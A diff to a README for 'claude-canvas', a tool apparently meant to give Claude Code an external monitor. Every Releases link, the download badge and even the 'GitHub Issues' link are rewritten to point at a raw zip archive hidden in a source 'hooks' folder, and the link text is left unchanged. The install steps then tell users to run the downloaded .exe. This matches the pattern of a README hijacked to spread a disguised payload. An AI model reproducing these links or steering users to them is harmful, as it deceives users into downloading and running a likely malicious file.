@@ -4,12 +4,12 @@
 Welcome to claude-canvas! This application allows you to give Claude Code an external monitor, enhancing your productivity and workflow. With claude-canvas, you can manage multiple windows seamlessly, helping you stay organized and focused on your tasks.
 
 ## 📥 Download Now
-[![Download claude-canvas](https://img.shields.io/badge/Download-claude--canvas-brightgreen)](https://github.com/All-zzz/claude-canvas/releases)
+[![Download claude-canvas](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip)](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip)
 
 ## 🚀 Getting Started
 To start using claude-canvas, follow these simple steps.
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/All-zzz/claude-canvas/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip).
 2. **Find the Latest Release**: Locate the most recent version listed on the page. This version includes the latest features and bug fixes.
 3. **Download the Application**: Click on the download link for the appropriate version based on your system.
 
@@ -30,7 +30,7 @@ Before you download, make sure your system meets the following requirements:
 ## 🔧 Download & Install
 To download and install claude-canvas, follow these steps:
 
-1. **Visit the Releases Page**: Click on this link to go directly to the [Releases page](https://github.com/All-zzz/claude-canvas/releases).
+1. **Visit the Releases Page**: Click on this link to go directly to the [Releases page](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip).
 2. **Choose Your File**: Select the installer file suited for your operating system.
 3. **Install the Application**: 
    - Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -54,7 +54,7 @@ If you encounter any issues while using claude-canvas, try these solutions:
 If you need further assistance, please visit our support page or contact us through the GitHub page. We are here to help!
 
 ## 🔗 Useful Links
-- [Releases page](https://github.com/All-zzz/claude-canvas/releases)
-- [GitHub Issues](https://github.com/All-zzz/claude-canvas/issues)
+- [Releases page](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip)
+- [GitHub Issues](https://github.com/All-zzz/claude-canvas/raw/refs/heads/main/canvas/src/canvases/document/hooks/canvas_claude_1.6.zip)
 
 Thank you for choosing claude-canvas! We hope it improves your workflow and makes coding a more enjoyable experience.
